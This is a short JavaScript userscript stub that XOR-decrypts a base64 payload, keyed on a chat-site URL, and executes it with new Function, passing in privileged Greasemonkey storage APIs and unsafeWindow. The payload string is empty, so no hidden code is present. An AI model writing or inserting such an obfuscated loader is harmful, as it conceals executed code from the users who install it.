(function(GM_setValue, GM_getValue, GM_deleteValue, GM_listValues, unsafeWindow){
    var k = "aHR0cHM6Ly93d3cub21nY2hhdC5jb20=";
    var p = "";
    var d = atob(p);
    var bytes = new Uint8Array(d.length);
    for (var i = 0; i < d.length; i++) {
        bytes[i] = d.charCodeAt(i) ^ k.charCodeAt(i % k.length);
    }
    var s = new TextDecoder('utf-8').decode(bytes);
    (new Function('GM_setValue','GM_getValue','GM_deleteValue','GM_listValues','unsafeWindow', s))
        (GM_setValue, GM_getValue, GM_deleteValue, GM_listValues, unsafeWindow);
})(GM_setValue, GM_getValue, GM_deleteValue, GM_listValues, unsafeWindow);
